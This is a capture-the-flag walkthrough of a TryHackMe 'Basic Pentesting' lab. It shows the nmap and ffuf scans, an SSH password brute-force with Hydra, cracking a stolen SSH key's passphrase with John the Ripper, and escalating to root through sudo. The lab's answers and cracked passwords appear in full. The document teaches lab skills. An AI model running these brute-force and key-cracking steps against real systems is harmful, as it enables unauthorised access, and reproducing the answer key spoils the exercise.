## TryHackMe easy Machine

![2022-07-23_19-10](https://user-images.githubusercontent.com/96860148/180613297-7c0d0162-bdf9-473a-bb80-156c4cbaf9e4.png)

# Q2. Find Services Exposed by the Machine
~~~
┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$ cat all_online_ports 
# Nmap 7.92 scan initiated Sat Jul 23 11:41:56 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -oN all_online_ports -v -r 10.10.40.124
Increasing send delay for 10.10.40.124 from 0 to 5 due to 69 out of 229 dropped probes since last increase.
Increasing send delay for 10.10.40.124 from 320 to 640 due to 86 out of 285 dropped probes since last increase.
Warning: 10.10.40.124 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.40.124
Host is up (0.17s latency).
Not shown: 40021 filtered tcp ports (no-response), 25509 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul 23 11:43:33 2022 -- 1 IP address (1 host up) scanned in 96.68 seconds
                                                                                                                                                                        
┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
~~~

# Q3. What is the name of the hidden directory on the web server(enter name without /)?

## Port 80
~~~
┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ffuf -u http://10.10.40.124/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.40.124/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 203ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 204ms]
.hta                    [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 209ms]
                        [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 218ms]
development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 291ms]
index.html              [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 397ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 228ms]
:: Progress: [4614/4614] :: Job [1/1] :: 192 req/sec :: Duration: [0:01:19] :: Errors: 1 ::
                                                                                                                                                                        
┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
~~~

## Port 8080
~~~
┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ffuf -u http://10.10.40.124:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.40.124:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11228, Words: 4258, Lines: 203, Duration: 179ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2756ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1498ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 469ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 707ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 234ms]
:: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:02:22] :: Errors: 80 ::
                                                                                                                                                                        
┌──(wolf㉿piratesec)-[~/BOXES/thm]
└─$
~~~

# Q4. User brute-forcing to find the username & password 
Checking the development directory, there is a conversion between a guy going with "k" and another "J". Obviously these are users and maybe we can use them to bruteforce. However these are their initials and won't help. So now I have to find them. From the port scan, port 445 is open and the smb could provide some info. True enough, i find the names of "K" and "J" from a file "staff.txt" in the smbclient.

Staff.txt
~~~
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
~~~

Bruteforcing SSH with Hydra
~~~
┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ hydra -L users -P ~/Tools/rockyou.txt ssh://10.10.40.124 -t 4 -V -I
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-23 12:19:58
DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
[DATA] attacking ssh://10.10.40.124:22/
[ATTEMPT] target 10.10.40.124 - login "Jan" - pass "123456" - 1 of 14344400 [child 0] (0/0)
[ATTEMPT] target 10.10.40.124 - login "Jan" - pass "12345" - 2 of 14344400 [child 1] (0/0)
[ATTEMPT] target 10.10.40.124 - login "Jan" - pass "123456789" - 3 of 14344400 [child 2] (0/0)
[ATTEMPT] target 10.10.40.124 - login "Jan" - pass "password" - 4 of 14344400 [child 3] (0/0)
[22][ssh] host: 10.10.40.124   login: jan  password: armando
1 of 1 target successfully completed, 1 valid password found
~~~

# Q5.What is the password?
~~~
armando
~~~

# Q6. What service do you use to access the server(answer in abbreviation in all caps)? 
~~~
SSH
~~~

# Q7. Enumerate the machine to find any vectors for privilege escalation 
# Q8. What is the name of the other user you found(all lower case)?
~~~
kay
~~~
# Q9. If you have found another user, what can you do with this information?
# Q10. What is the final password you obtain?

In kay's directory I find a file "pass.bak" which I think is the answer. However, I can't read the file because I don't have the necessary permissions and I can't run sudo on the machine. Time for privesc...here comes linpeas
~~~
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

sh: 1197: [[: not found
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found
~~~

Trying to exploit this vulnerability was futile as I'm running as user Jan who seems to not have the necessary write permissions to create the files neede to escalate. Time to look around... Hehe, I can be able to read kay's private key.I copy the contents. When I try to login using te private_key, turns out it's encrypted and I'm asked for the password.
Time to bruteforce with JohnTheRipper to get the password protecting the private key.

~~~
┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ ssh2john id_rsa > hash

┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ john --wordlist=~/Tools/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:04 DONE (2022-07-23 13:15) 0.2183g/s 18068p/s 18068c/s 18068C/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                        
┌──(wolf㉿piratesec)-[~/BOXES/thm/BasicPentesting]
└─$ 
~~~

Bingo, now I can login and read the contents of "pass.bak" and answer the questions.
~~~
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ 
~~~

I can't leave it like that without privesc
Using the password, user Kay can run all commands as sudo
~~~
kay@basic2:~$ sudo -l
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
kay@basic2:~$ 
~~~

## Privesc
~~~
kay@basic2:~$ sudo su
root@basic2:/home/kay#
~~~
